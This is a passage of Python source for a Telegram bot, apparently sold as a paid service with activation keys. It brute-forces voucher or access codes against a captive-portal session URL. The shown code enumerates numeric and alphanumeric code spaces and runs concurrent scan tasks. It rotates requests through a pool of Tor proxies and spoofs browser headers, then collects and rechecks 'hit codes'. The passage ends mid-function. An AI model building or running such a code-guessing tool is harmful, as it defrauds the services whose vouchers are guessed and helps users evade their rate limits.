        await bot.reply_to(
            message,
            "❌ Key Code မမှန်ပါ။ သင့် User ID အတွက်ပေးထားတဲ့ Code ကို ပြန်စစ်ပြီးထည့်ပါ။"
        )
        return

    if key_record.get("activated"):
        awaiting_key_code.discard(chat_id)
        approve[chat_id] = True
        user_data[chat_id] = {}
        await bot.reply_to(
            message,
            "✅ Key ကို အသက်သွင်းပြီးသားပါ။ Unlimited သုံးနိုင်ပါပြီ။",
            reply_markup=build_main_menu(chat_id)
        )
        return

    key_record["activated"] = True
    key_record["activated_at"] = datetime.now(timezone.utc).isoformat()
    try:
        await update_file_content(
            "auth_list.json",
            auth_list,
            sha,
            f"Activate key for {user_id}"
        )
    except Exception as e:
        print(f"[redeem_user_key] {e}")
        await bot.reply_to(
            message,
            "❌ Key ကို activate လုပ်ရာမှာ မအောင်မြင်ပါ။ ခဏနေပြီး code ကို ထပ်ထည့်ကြည့်ပါ။"
        )
        return
    awaiting_key_code.discard(chat_id)
    approve[chat_id] = True
    user_data[chat_id] = {}
    await bot.reply_to(
        message,
        "✅ Key Code မှန်ကန်ပါတယ်။\n"
        "♾️ Unlimited PAID USER အဖြစ် အသက်သွင်းပြီးပါပြီ။",
        reply_markup=build_main_menu(chat_id)
    )

def generate_expiry(plan):
    now = datetime.now(timezone.utc)
    plans = {
        "30m": timedelta(minutes=30),
        "1h": timedelta(hours=1),
        "1d": timedelta(days=1),
        "7d": timedelta(days=7),
        "1m": timedelta(days=30),
        "1y": timedelta(days=365),
        "unlimited": None
    }
    if plan not in plans:
        return None
    if plan == "unlimited":
        return "9999-12-31T23:59:59Z"
    return (now + plans[plan]).isoformat()

def get_current_time():
    return datetime.now(timezone.utc)

@bot.message_handler(commands=['recheck'])
async def recheck(message):
    chat_id = message.chat.id
    if not approve.get(chat_id, False):
        await bot.reply_to(message, "/recheck ကိုအသုံးမပြုမီ /key ကိုအရင်ပြုလုပ်ပေးပါ။")
        return
    auth_list, _ = await get_file_content("auth_list.json")
    if has_active_key(auth_list.get(str(message.chat.id))):
        results, sha = await get_file_content("result.json")
        chat_id_str = str(message.chat.id)
        if chat_id_str in results and results[chat_id_str]:
            if message.chat.id not in user_data:
                await bot.reply_to(message, "/scan ကိုအသုံးမပြုမီ /key ကိုအရင်ပြုလုပ်ပေးပါ။")
                return
            if "session_url" not in user_data[message.chat.id]:
                await bot.reply_to(message, "/recheck ကိုအသုံးမပြုမီ /input ဖြင့် Session URL ကိုအရင်ထည့်သွင်းပေးရပါမည်။")
                return
            codes = results[chat_id_str]
            await bot.reply_to(message, f"Success Code များအား ပြန်လည်စစ်ဆေးနေပါသည်။")
            session_url_recheck = user_data[message.chat.id]["session_url"]
            recheck_list = []
            for code in codes:
                recode = await perform_check(
                    session_url_recheck,
                    code,
                    chat_id,
                    scan_id=None,
                    recheck=True,
                    message=message
                )
                if recode:
                    recheck_list.append(recode)
            to_show = "\n".join(recheck_list) if recheck_list else "Code များအားလုံးစစ်ဆေးပြီးပါပြီ မည်သည့် success code မျှရှာမတွေ့ပါ။"
            await bot.reply_to(message, f"✅ Rechcked Codes:\n\n{to_show}")
            await save_rechecked_codes(chat_id_str, recheck_list, sha)
        else:
            await bot.reply_to(message, "သင့်တွင် success code တစ်ခုမျှမရှိသေးပါ။")
    else:
        await bot.reply_to(message, "သင်၏ key ကို registered မလုပ်ရသေးပါ။")

async def save_rechecked_codes(chat_id_str, recheck_list, sha):
    results, _ = await get_file_content("result.json")
    results[chat_id_str] = recheck_list
    await update_file_content("result.json", results, sha, f"Update after recheck for {chat_id_str}")

async def check_session_url(session_url):
    headers = {
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'accept-language': 'en-US,en;q=0.9',
        'priority': 'u=0, i',
        'referer': session_url,
        'sec-ch-ua': '"Chromium";v="148", "Microsoft Edge";v="148", "Not/A)Brand";v="99"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origin',
        'upgrade-insecure-requests': '1',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Safari/537.36 Edg/148.0.0.0',
        'cookie': 'sensorsdata2015jssdkcross=%7B%22distinct_id%22%3A%2219e0ddbd9f2152-0df941f2efc6b08-4c657b58-1327104-19e0ddbd9f3a60%22%2C%22first_id%22%3A%22%22%2C%22props%22%3A%7B%22%24latest_traffic_source_type%22%3A%22%E8%87%AA%E7%84%B6%E6%90%9C%E7%B4%A2%E6%B5%81%E9%87%8F%22%2C%22%24latest_search_keyword%22%3A%22%E6%9C%AA%E5%8F%96%E5%88%B0%E5%80%BC%22%2C%22%24latest_referrer%22%3A%22https%3A%2F%2Fgemini.google.com%2F%22%7D%2C%22identities%22%3A%22eyIkaWRlbnRpdHlfY29va2llX2lkIjoiMTllMGRkYmQ5ZjIxNTItMGRmOTQxZjJlZmM2YjA4LTRjNjU3YjU4LTEzMjcxMDQtMTllMGRkYmQ5ZjNhNjAifQ%3D%3D%22%2C%22history_login_id%22%3A%7B%22name%22%3A%22%22%2C%22value%22%3A%22%22%7D%2C%22%24device_id%22%3A%2219e0ddbd9f2152-0df941f2efc6b08-4c657b58-1327104-19e0ddbd9f3a60%22%7D'
    }
    try:
        async with session.get(session_url, allow_redirects=True, headers=headers) as response:
            final_url = str(response.url)
            body = await response.text()
            print(f"[check_session_url] final_url={final_url} status={response.status}")
            if "sessionId" in final_url or "sessionId" in body:
                return True
            if response.status in (200, 302, 301):
                return True
            return False
    except Exception as e:
        print(f"[check_session_url] error: {e}")
        return False

@bot.message_handler(commands=['input', 'portal'])
async def handle_input(message):
    args = message.text.split(maxsplit=1)
    if len(args) < 2:
        await bot.reply_to(
            message,
            portal_instruction_text(),
            reply_markup=build_back_menu()
        )
        return
    await save_session_url(message, args[1])

async def save_session_url(message, url):
    if message.chat.id in user_data:
        await bot.reply_to(
            message,
            "🔄 Session URL အားစစ်ဆေးနေပါသည်။"
        )
        if await check_session_url(session_url=url):
            user_data[message.chat.id]['session_url'] = url
            await bot.reply_to(
                message,
                "✅ Portal URL သိမ်းဆည်းပြီးပါပြီ။\n\n"
                "🎟️ VOUCHER ရွေးချယ်ရန် Menu ကိုနှိပ်ပါ။",
                reply_markup=build_scan_menu()
            )
        else:
            await bot.reply_to(
                message,
                "❌ Session URL မှားယွင်းနေပါသည်။",
                reply_markup=build_main_menu(message.chat.id)
            )
    else:
        await bot.reply_to(
            message,
            "⚠️ Session URL မထည့်မီ Key ကို အရင်စစ်ပါ။",
            reply_markup=build_main_menu(message.chat.id)
        )

@bot.message_handler(commands=['scan'])
async def scan(message):
    args = message.text.split(maxsplit=1)
    if len(args) < 2:
        await bot.reply_to(
            message,
            "🔍 Scan mode ရွေးပါ။",
            reply_markup=build_scan_menu()
        )
        return
    await start_scan_mode(message, args[1].strip())

async def start_scan_mode(message, mode, leading_digit=None):
    chat_id = message.chat.id
    auth_list, _ = await get_file_content("auth_list.json")
    if not has_active_key(auth_list.get(str(chat_id))):
        approve[chat_id] = False
        await bot.reply_to(
            message,
            "🔑 Scan မစတင်မီ PAID USER ကိုနှိပ်ပြီး Key ကို activate လုပ်ပါ။"
        )
        return
    if not approve.get(chat_id, False):
        await bot.reply_to(message, "/scan ကိုအသုံးမပြုမီ /key ကိုအရင်ပြုလုပ်ပေးပါ။")
        return
    chat_id = message.chat.id
    if chat_id not in user_data:
        await bot.reply_to(message, "/scan ကိုအသုံးမပြုမီ /key ကိုအရင်ပြုလုပ်ပေးပါ။")
        return
    if 'session_url' not in user_data[chat_id]:
        await bot.reply_to(message, "/scan ကိုအသုံးမပြုမီ /input ဖြင့် Session URL ကိုအရင်ထည့်သွင်းပေးရပါမည်။")
        return

    if (
        chat_id in scan_tasks
        and not scan_tasks[chat_id]["task"].done()
    ):
        await bot.reply_to(
            message,
            "/scan သည် အလုပ်လုပ်နေပြီဖြစ်သည် /scan ကိုထပ်မံမလုပ်ပါနှင့်။"
        )
        return

    progress_msg = await bot.send_message(
        chat_id,
        format_progress(
            0,
            scan_total(mode, leading_digit),
            current_code="-"
        ),
        reply_markup=build_scan_stop_menu()
    )
    scan_id = str(uuid.uuid4())
    task = asyncio.create_task(
        run_bruteforce(
            mode,
            chat_id,
            user_data[chat_id]['session_url'],
            scan_id,
            message=message,
            progress_msg=progress_msg,
            leading_digit=leading_digit
        )
    )

    scan_tasks[chat_id] = {
        "task": task,
        "stop": False,
        "scan_id": scan_id,
        "checked": 0,
        "total": None,
        "speed": 0,
        "found": 0,
        "retries": 0,
        "current_code": "-",
        "progress_message_id": progress_msg.message_id,
        "start_time": time.monotonic(),
        "mode": mode,
        "leading_digit": leading_digit,
    }

@bot.message_handler(commands=['status'])
async def status(message):
    if str(message.chat.id) != ADMIN_ID:
        await bot.reply_to(message, "No Permission")
        return
    active_scans = sum(
        1 for data in scan_tasks.values()
        if not data["task"].done()
    )
    approved_users = sum(1 for v in approve.values() if v)
    uptime_seconds = int(time.monotonic() - _start_time)
    hours, remainder = divmod(uptime_seconds, 3600)
    minutes, seconds = divmod(remainder, 60)
    await bot.reply_to(
        message,
        f"📊 Bot Status\n\n"
        f"⏱ Uptime: {hours}h {minutes}m {seconds}s\n"
        f"🔍 Active Scans: {active_scans}\n"
        f"✅ Approved Users: {approved_users}\n"
        f"👥 Sessions Loaded: {len(user_data)}"
    )

@bot.message_handler(commands=['setconcurrency'])
async def set_concurrency(message):
    if str(message.chat.id) != ADMIN_ID:
        await bot.reply_to(message, "No Permission")
        return
    global CONCURRENCY
    args = message.text.split()
    if len(args) < 2 or not args[1].isdigit():
        await bot.reply_to(message, f"Usage: /setconcurrency 1000\nCurrent: {CONCURRENCY}")
        return
    CONCURRENCY = int(args[1])
    await bot.reply_to(message, f"✅ Concurrency set to {CONCURRENCY}")

@bot.message_handler(commands=['setbatch'])
async def set_batch(message):
    if str(message.chat.id) != ADMIN_ID:
        await bot.reply_to(message, "No Permission")
        return
    global BATCH_SIZE
    args = message.text.split()
    if len(args) < 2 or not args[1].isdigit():
        await bot.reply_to(message, f"Usage: /setbatch 1000\nCurrent: {BATCH_SIZE}")
        return
    BATCH_SIZE = int(args[1])
    await bot.reply_to(message, f"✅ Batch size set to {BATCH_SIZE}")

@bot.message_handler(commands=['settorpool'])
async def set_tor_pool(message):
    if str(message.chat.id) != ADMIN_ID:
        await bot.reply_to(message, "No Permission")
        return
    global TOR_POOL_SIZE
    args = message.text.split()
    if len(args) < 2 or not args[1].isdigit() or int(args[1]) < 1:
        await bot.reply_to(message, f"Usage: /settorpool 5\nCurrent: {TOR_POOL_SIZE} (active: {len(_tor_processes)})")
        return
    TOR_POOL_SIZE = int(args[1])
    await bot.reply_to(
        message,
        f"✅ Tor pool size set to {TOR_POOL_SIZE}\n"
        f"ℹ️ Applies on next /proxy toggle (current active: {len(_tor_processes)})"
    )

@bot.message_handler(commands=['stats'])
async def scan_stats(message):
    if str(message.chat.id) != ADMIN_ID:
        await bot.reply_to(message, "No Permission")
        return
    active = {cid: d for cid, d in scan_tasks.items() if not d["task"].done()}
    if not active:
        await bot.reply_to(message, "📭 No active scans running.")
        return
    lines = [f"📡 Live Scan Stats ({len(active)} active)\n"]
    for cid, d in active.items():
        checked = d.get("checked", 0)
        total = d.get("total")
        speed = d.get("speed", 0)
        found = d.get("found", 0)
        retries = d.get("retries", 0)
        mode = d.get("mode", "?")
        elapsed_s = int(time.monotonic() - d.get("start_time", time.monotonic()))
        h, rem = divmod(elapsed_s, 3600)
        m, s = divmod(rem, 60)
        elapsed_str = f"{h}h {m}m {s}s" if h else f"{m}m {s}s"
        if total:
            percent = (checked / total) * 100
            remaining_codes = total - checked
            eta_min = (remaining_codes / speed) if speed > 0 else None
            eta_str = f"{int(eta_min)}m" if eta_min is not None else "Unknown"
            lines.append(
                f"👤 User: {cid}\n"
                f"🎯 Mode: {mode}-digit\n"
                f"📦 Checked: {checked:,}/{total:,} ({percent:.1f}%)\n"
                f"⚡ Speed: {speed:,.0f} codes/min\n"
                f"✅ Found: {found} | 🔁 Retry: {retries}\n"
                f"⏱ Elapsed: {elapsed_str} | ETA: {eta_str}\n"
            )
        else:
            lines.append(
                f"👤 User: {cid}\n"
                f"🎯 Mode: {mode}\n"
                f"📦 Checked: {checked:,}\n"
                f"⚡ Speed: {speed:,.0f} codes/min\n"
                f"✅ Found: {found} | 🔁 Retry: {retries}\n"
                f"⏱ Elapsed: {elapsed_str}\n"
            )
    await bot.reply_to(message, "\n".join(lines))

@bot.message_handler(commands=['stop'])
async def stop_scan(message):
    chat_id = message.chat.id
    stopped, stopped_hits, snapshot = await stop_scan_task(chat_id)
    if stopped:
        await show_stopped_scan(chat_id, snapshot, stopped_hits)
        await bot.reply_to(
            message,
            f"🔴 Scanner Stopped\n✅ Hits: {len(stopped_hits)}",
            reply_markup=build_back_menu()
        )
        if stopped_hits:
            await send_hit_codes_file(chat_id, stopped_hits)
    else:
        await bot.reply_to(
            message,
            "🔴 Scanner အလုပ်လုပ်နေခြင်း မရှိပါ။",
            reply_markup=build_back_menu()
        )

async def stop_scan_task(chat_id):
    data = scan_tasks.get(chat_id)
    if data and not data["task"].done():
        stopped_hits = list(success_texts.get(chat_id, []))
        snapshot = {
            "checked": data.get("checked", 0),
            "total": data.get("total"),
            "speed": data.get("speed", 0),
            "retries": data.get("retries", 0),
            "current_code": data.get("current_code", "-"),
            "progress_message_id": data.get("progress_message_id"),
        }
        data["stop"] = True
        data["scan_id"] = None
        data["task"].cancel()
        success_messages.pop(chat_id, None)
        success_texts.pop(chat_id, None)
        limited_messages.pop(chat_id, None)
        limited_texts.pop(chat_id, None)
        retry_counts.pop(chat_id, None)
        _session_pool.pop(chat_id, None)
        return True, stopped_hits, snapshot
    return False, [], None

@bot.callback_query_handler(
    func=lambda call: bool(call.data) and (
        call.data.startswith("menu:")
        or call.data.startswith("scan:")
        or call.data.startswith("numberprefix:")
        or call.data.startswith("genplan:")
        or call.data.startswith("proxy:")
        or call.data == "key:enter"
        or call.data == "ui:cancel"
    )
)
async def handle_ui_callback(call):
    await bot.answer_callback_query(call.id)
    chat_id = call.message.chat.id
    data = call.data

    if data == "key:enter":
        auth_list, _ = await get_file_content("auth_list.json")
        key_record = auth_list.get(str(chat_id))
        if (
            isinstance(key_record, dict)
            and key_record.get("activation_code_hash")
            and not key_record.get("activated", False)
        ):
            awaiting_key_code.add(chat_id)
            await bot.send_message(
                chat_id,
                "🔑 BOPAING Key Code ကို ဒီမှာ ပို့ပါ။\n"
                "သင့် User ID အတွက် ထုတ်ထားတဲ့ Key ကိုသာ အသုံးပြုနိုင်ပါတယ်။"
            )
        else:
            await bot.send_message(
                chat_id,
                "❌ သင့် User ID အတွက် activate လုပ်ရန် Key မရှိပါ။",
                reply_markup=build_main_menu(chat_id)
            )
        return

    if data.startswith("proxy:"):
        action = data.split(":", 1)[1]
        if action.startswith("start:"):
            count = action.split(":", 1)[1]
            if not count.isdigit() or not 1 <= int(count) <= 10:
                await bot.send_message(
                    chat_id,
                    "❌ Proxy count သည် 1 နဲ့ 10 ကြား ဖြစ်ရပါမယ်။",
                    reply_markup=build_proxy_count_menu()
                )
                return
            call.message.text = f"/proxy {count}"
            await proxy_command(call.message)
        elif action == "stop":
            call.message.text = "/proxy"
            await proxy_command(call.message)
        elif action == "rotate":
            call.message.text = "/proxy rotate"
            await proxy_command(call.message)
        await bot.send_message(
            chat_id,
            await build_main_menu_text(chat_id, call.from_user),
            reply_markup=build_main_menu(chat_id)
        )
        return

    if data.startswith("menu:"):
        action = data.split(":", 1)[1]

        if action == "home":
            awaiting_session_url.discard(chat_id)
            awaiting_key_code.discard(chat_id)
            pending_genkey_plan.pop(chat_id, None)
            awaiting_delete_key.discard(chat_id)
            menu_text = await build_main_menu_text(
                chat_id,
                call.from_user
            )
            await bot.edit_message_text(
                menu_text,
                chat_id,
                call.message.message_id,
                reply_markup=build_main_menu(chat_id)
            )
        elif action == "key":
            await handle_key(call.message)
        elif action == "input":
            awaiting_session_url.add(chat_id)
            await bot.send_message(
                chat_id,
                portal_instruction_text(),
                reply_markup=build_back_menu()
            )
        elif action == "proxy":
            proxy_state = "ON" if proxy_enabled else "OFF"
            proxy_icon = "🟢" if proxy_enabled else "🔴"
            await bot.send_message(
                chat_id,
                f"{proxy_icon} Proxy Status: {proxy_state}\n"
                "အောက်က button နဲ့ Proxy ကို ထိန်းချုပ်ပါ။",
                reply_markup=build_proxy_control_menu()
            )
        elif action == "addproxy":
            await bot.send_message(
                chat_id,
                "➕ Proxy အရေအတွက် ရွေးပါ။",
                reply_markup=build_proxy_count_menu()
            )
        elif action == "scan":
            await bot.send_message(
                chat_id,
                "🔍 Scan mode ရွေးပါ။",
                reply_markup=build_scan_menu()
            )
        elif action == "result":
            await handle_result(call.message)
        elif action == "recheck":
            await recheck(call.message)
        elif action == "stop":
            stopped, stopped_hits, snapshot = await stop_scan_task(chat_id)
            if stopped:
                await show_stopped_scan(chat_id, snapshot, stopped_hits)
                stopped_text = f"🔴 Scanner Stopped\n✅ Hits: {len(stopped_hits)}"
            else:
                stopped_text = "🔴 Scanner အလုပ်လုပ်နေခြင်း မရှိပါ။"
            if stopped and stopped_hits:
                await send_hit_codes_file(chat_id, stopped_hits)
            else:
                try:
                    await bot.edit_message_text(
                        stopped_text,
                        chat_id,
                        call.message.message_id,
                        reply_markup=build_back_menu()
                    )
                except Exception:
                    await bot.send_message(
                        chat_id,
                        stopped_text,
                        reply_markup=build_back_menu()
                    )
        elif action == "admin":
            if str(chat_id) != ADMIN_ID:
                await bot.send_message(chat_id, "❌ No Permission")
            else:
                await bot.edit_message_text(
                    "⚒️ Admin Panel\nလုပ်ဆောင်ချက်ကို ရွေးပါ။",
                    chat_id,
                    call.message.message_id,
                    reply_markup=build_admin_menu()
                )
        elif action == "genkey":
            if str(chat_id) != ADMIN_ID:
                await bot.send_message(chat_id, "❌ No Permission")
            else:
                await bot.send_message(
                    chat_id,
                    "🔑 Key plan ရွေးပါ။",
                    reply_markup=build_plan_menu()
                )
        elif action == "listkeys":
            await listkeys(call.message)
        elif action == "delkey":
            if str(chat_id) != ADMIN_ID:
                await bot.send_message(chat_id, "❌ No Permission")
            else:
                awaiting_delete_key.add(chat_id)
                await bot.send_message(
                    chat_id,
                    "🗑 ဖျက်မည့် User ID ကို ပို့ပါ။\n"
                    "ပယ်ဖျက်ရန် Main Menu ကိုနှိပ်ပါ။"
                )
        elif action == "status":
            await status(call.message)
        elif action == "stats":
            await scan_stats(call.message)
        return

    if data == "ui:cancel":
        pending_genkey_plan.pop(chat_id, None)
        awaiting_delete_key.discard(chat_id)
        awaiting_session_url.discard(chat_id)
        awaiting_key_code.discard(chat_id)
        await bot.send_message(
            chat_id,
            "❌ လုပ်ဆောင်ချက်ကို ပယ်ဖျက်ပြီးပါပြီ။",
            reply_markup=build_main_menu(chat_id)
        )
        return

    if data.startswith("numberprefix:"):
        _, mode, selected = data.split(":", 2)
        if mode not in {"6", "7", "8", "9"}:
            await bot.send_message(
                chat_id,
                "❌ Number mode မမှန်ကန်ပါ။",
                reply_markup=build_scan_menu()
            )
            return
        if selected == "random":
            leading_digit = None
        elif selected in string.digits:
            leading_digit = selected
        else:
            await bot.send_message(
                chat_id,
                "❌ ရွေးချယ်မှု မမှန်ကန်ပါ။",
                reply_markup=build_number_prefix_menu(mode)
            )
            return
        await start_scan_mode(call.message, mode, leading_digit=leading_digit)
        return

    if data.startswith("scan:"):
        mode = data.split(":", 1)[1]
        if mode in {"6", "7", "8", "9"}:
            await bot.send_message(
                chat_id,
                f"🔢 Number {mode} ကို ဘယ် digit နဲ့စပြီးရှာမလဲ ရွေးပါ။\n"
                "မသတ်မှတ်လိုပါက 🎲 Random ကိုရွေးပါ။",
                reply_markup=build_number_prefix_menu(mode)
            )
            return
        await start_scan_mode(call.message, mode)
        return

    if data.startswith("genplan:"):
        if str(chat_id) != ADMIN_ID:
            await bot.send_message(chat_id, "❌ No Permission")
            return
        plan = data.split(":", 1)[1]
        if plan != "unlimited":
            await bot.send_message(chat_id, "❌ Key Plan မမှန်ကန်ပါ။")
            return
        pending_genkey_plan[chat_id] = plan
        await bot.send_message(
            chat_id,
            "🔑 Key Code ပေးမည့် User ID ကို ပို့ပါ။\n"
            "ပယ်ဖျက်ရန် /menu ကိုနှိပ်ပါ။"
        )

@bot.message_handler(
    func=lambda message: (
        bool(message.text)
        and message.chat.id in awaiting_key_code
        and not message.text.startswith("/")
    )
)
async def handle_key_code_input(message):
    if message.text.strip() == MENU_BUTTON:
        awaiting_key_code.discard(message.chat.id)
        await show_menu(message)
        return
    await redeem_user_key(message, message.text)

@bot.message_handler(
    func=lambda message: (
        bool(message.text)
        and message.chat.id in awaiting_session_url
        and not message.text.startswith("/")
    )
)
async def handle_session_url_from_menu(message):
    awaiting_session_url.discard(message.chat.id)
    await save_session_url(message, message.text.strip())

@bot.message_handler(
    func=lambda message: (
        bool(message.text)
        and message.chat.id in pending_genkey_plan
        and not message.text.startswith("/")
    )
)
async def handle_genkey_from_menu(message):
    pending_genkey_plan.pop(message.chat.id)
    user_id = message.text.strip()
    message.text = f"/genkey {user_id}"
    await genkey(message)

@bot.message_handler(
    func=lambda message: (
        bool(message.text)
        and message.chat.id in awaiting_delete_key
        and not message.text.startswith("/")
    )
)
async def handle_delkey_from_menu(message):
    awaiting_delete_key.discard(message.chat.id)
    message.text = f"/delkey {message.text.strip()}"
    await delkey(message)

@bot.message_handler(
    func=lambda message: bool(message.text) and message.text in {
        USER_KEY_BUTTON,
        USER_INPUT_BUTTON,
        USER_SCAN_BUTTON,
        USER_RESULT_BUTTON,
        USER_RECHECK_BUTTON,
        USER_STOP_BUTTON,
        PROXY_STATUS_BUTTON,
        ADD_PROXY_BUTTON,
        ADMIN_PANEL_BUTTON,
        MENU_BUTTON,
        ADMIN_GENKEY_BUTTON,
        ADMIN_LISTKEY_BUTTON,
        ADMIN_DELKEY_BUTTON,
        ADMIN_STATUS_BUTTON,
        ADMIN_STATS_BUTTON,
    }
)
async def handle_menu_action(message):
    action = message.text

    if action == USER_KEY_BUTTON:
        await handle_key(message)
    elif action == USER_INPUT_BUTTON:
        awaiting_session_url.add(message.chat.id)
        await bot.reply_to(
            message,
            portal_instruction_text(),
            reply_markup=build_back_menu()
        )
    elif action == PROXY_STATUS_BUTTON:
        proxy_state = "ON" if proxy_enabled else "OFF"
        await bot.reply_to(
            message,
            f"🟢 Proxy Status: {proxy_state}",
            reply_markup=build_back_menu()
        )
    elif action == ADD_PROXY_BUTTON:
        await bot.reply_to(
            message,
            "➕ Proxy ထည့်ရန် /proxy <count> ကို အသုံးပြုပါ။",
            reply_markup=build_back_menu()
        )
    elif action == USER_SCAN_BUTTON:
        await bot.reply_to(
            message,
            "🔍 Scan mode ရွေးပါ။",
            reply_markup=build_scan_menu()
        )
    elif action == USER_RESULT_BUTTON:
        await handle_result(message)
    elif action == USER_RECHECK_BUTTON:
        await recheck(message)
    elif action == USER_STOP_BUTTON:
        await stop_scan(message)
    elif action == MENU_BUTTON:
        await show_menu(message)
    elif action == ADMIN_PANEL_BUTTON:
        if str(message.chat.id) != ADMIN_ID:
            await bot.reply_to(message, "❌ No Permission")
            return
        await bot.reply_to(
            message,
            "⚒️ Admin Panel\nလုပ်ဆောင်ချက်ကို ရွေးပါ။",
            reply_markup=build_admin_menu()
        )
    elif action == ADMIN_GENKEY_BUTTON:
        if str(message.chat.id) != ADMIN_ID:
            await bot.reply_to(message, "❌ No Permission")
            return
        await bot.reply_to(
            message,
            "🔑 Key plan ရွေးပါ။",
            reply_markup=build_plan_menu()
        )
    elif action == ADMIN_LISTKEY_BUTTON:
        await listkeys(message)
    elif action == ADMIN_DELKEY_BUTTON:
        if str(message.chat.id) != ADMIN_ID:
            await bot.reply_to(message, "❌ No Permission")
            return
        awaiting_delete_key.add(message.chat.id)
        await bot.reply_to(message, "🗑 ဖျက်မည့် User ID ကို ပို့ပါ။")
    elif action == ADMIN_STATUS_BUTTON:
        await status(message)
    elif action == ADMIN_STATS_BUTTON:
        await scan_stats(message)

async def github_update_scheduler():
    global SUCCESS_CODE
    while True:
        await asyncio.sleep(80)
        items = []
        while not SUCCESS_CODE.empty():
            items.append(await SUCCESS_CODE.get())
        if items:
            try:
                results, sha = await get_file_content("result.json")
                for item in items:
                    chat_id = str(item["chat_id"])
                    code = item["code"]
                    if chat_id not in results:
                        results[chat_id] = []
                    if code not in results[chat_id]:
                        results[chat_id].append(code)
                await update_file_content(
                    "result.json",
                    results,
                    sha,
                    "Periodic Update"
                )
            except Exception as e:
                print(f"Update Error: {e}")

def digit_generator(length):
    return "".join(random.choice(string.digits) for _ in range(length))

strings = string.ascii_lowercase + string.digits
def all_generator(length=6):
    return "".join(random.choice(strings) for _ in range(length))

strings_2 = string.ascii_lowercase
def ascii_generator(length=6):
    return "".join(random.choice(strings_2) for _ in range(length))

def scan_total(mode, leading_digit=None):
    if mode in ["6", "7"]:
        return 10 ** (int(mode) - 1 if leading_digit is not None else int(mode))
    return None

def iter_codes(mode, leading_digit=None):
    if mode in ["6", "7"]:
        length = int(mode)
        if leading_digit is None:
            start = 0
            end = 10 ** length
        else:
            start = int(leading_digit) * (10 ** (length - 1))
            end = (int(leading_digit) + 1) * (10 ** (length - 1))
        codes = [str(i).zfill(length) for i in range(start, end)]
        random.shuffle(codes)
        yield from codes
        return
    if mode in {"8", "9"}:
        length = int(mode)
        while True:
            suffix = digit_generator(length - 1)
            yield f"{leading_digit}{suffix}" if leading_digit is not None else digit_generator(length)
    if mode == "ascii-lower":
        while True:
            yield ascii_generator(6)
    if mode.startswith("mix-"):
        try:
            length = int(mode.split("-", 1)[1])
        except (TypeError, ValueError):
            raise ValueError(f"Unsupported scan mode: {mode}")
        if length not in (6, 7, 8):
            raise ValueError(f"Unsupported scan mode: {mode}")
        while True:
            yield all_generator(length)
    if mode == "all":
        while True:
            yield all_generator(6)
    raise ValueError(f"Unsupported scan mode: {mode}")

TELEGRAM_TEXT_LIMIT = 4096
PROGRESS_HIT_TEXT_LIMIT = 2600


def split_telegram_text(text, limit=TELEGRAM_TEXT_LIMIT - 100):
    """Split long Telegram messages without breaking hit-code entries."""
    if len(text) <= limit:
        return [text]

    chunks = []
    current = ""
    for block in text.split("\n\n"):
        candidate = block if not current else f"{current}\n\n{block}"
        if len(candidate) <= limit:
            current = candidate
            continue

        if current:
            chunks.append(current)
        if len(block) <= limit:
            current = block
        else:
            for start in range(0, len(block), limit):
                chunks.append(block[start:start + limit])
            current = ""

    if current:
        chunks.append(current)
    return chunks or [text[:limit]]


async def send_chunked_messages(chat_id, text, reply_markup=None):
    """Send a long result as multiple Telegram messages."""
    chunks = split_telegram_text(text)
    for index, chunk in enumerate(chunks):
        await bot.send_message(
            chat_id,
            chunk,
            reply_markup=reply_markup if index == len(chunks) - 1 else None,
        )


async def send_hit_codes_file(chat_id, hit_codes):
    """Send all hit details as a UTF-8 text file."""
    if not hit_codes:
        return
    timestamp = datetime.now(timezone.utc).strftime("%Y%m%d_%H%M%S")
    content = (
        "Hit Codes\n"
        "━━━━━━━━━━━━\n\n"
        + "\n\n".join(hit_codes)
        + "\n"
    )
    document = types.InputFile(
        io.BytesIO(content.encode("utf-8")),
        file_name=f"hit_codes_{timestamp}.txt",
    )
    await bot.send_document(
        chat_id,
        document,
        caption=f"📄 Hit codes test file\n✅ Hits: {len(hit_codes)}",
    )


async def show_stopped_scan(chat_id, snapshot, hit_codes):
    """Keep the full scan summary visible after the scanner is stopped."""
    snapshot = snapshot or {}
    stopped_text = format_progress(
        snapshot.get("checked", 0),
        snapshot.get("total"),
        snapshot.get("speed", 0),
        len(hit_codes),
        snapshot.get("retries", 0),
        current_code=snapshot.get("current_code", "-"),
        hit_codes=hit_codes,
        state="stopped",
    )
    progress_message_id = snapshot.get("progress_message_id")
    if progress_message_id:
        try:
            await bot.edit_message_text(
                chat_id=chat_id,
                message_id=progress_message_id,
                text=stopped_text,
                reply_markup=build_back_menu(),
            )
            return
        except Exception as err:
            print(f"Stopped Progress Message Error: {err}")
    await bot.send_message(
        chat_id,
        stopped_text,
        reply_markup=build_back_menu(),
    )


def format_progress(
    checked,
    total=None,
    speed=0,
    found=0,
    retries=0,
    current_code="-",
    hit_codes=None,
    state="running",
):
    speed_str = f"{speed:,.0f} codes/min"
    hit_codes = hit_codes or []
    all_hit_text = "\n\n".join(hit_codes)
    if len(all_hit_text) <= PROGRESS_HIT_TEXT_LIMIT:
        hit_text = all_hit_text
    else:
        hit_text = (
            f"{all_hit_text[:PROGRESS_HIT_TEXT_LIMIT].rsplit(chr(10), 1)[0]}\n\n"
            "📄 Hit code အပြည့်အစုံကို scan ပြီးတဲ့အခါ အပိုင်းခွဲပို့ပေးပါမယ်။"
        )
    hit_section = f"\n\n✅ Hit Codes:\n{hit_text}" if hit_text else ""
    heading = "🟢 Scanner Running" if state == "running" else "🔴 Scanner Stopped"
    proxy_count = len(_tor_processes) if proxy_enabled else 0
    proxy_total = len(_tor_processes) if _tor_processes else 0
    proxy_text = f"{proxy_count}/{proxy_total}" if proxy_total else "Direct"
    if total is not None:
        bar_length = 20
        percent = (checked / total) * 100
        filled = min(bar_length, int(percent / 5))
        bar = "█" * filled + "░" * (bar_length - filled)
        return (
            f"{heading}\n"
            "Thank for using By Telegram @bopaing_789\n"
            "━━━━━━━━━━━━\n"
            f"✅ Tried: {checked:,}/{total:,}\n"
            f"🔄 Current Code: {current_code}\n"
            f"✅ Hits: {found}\n"
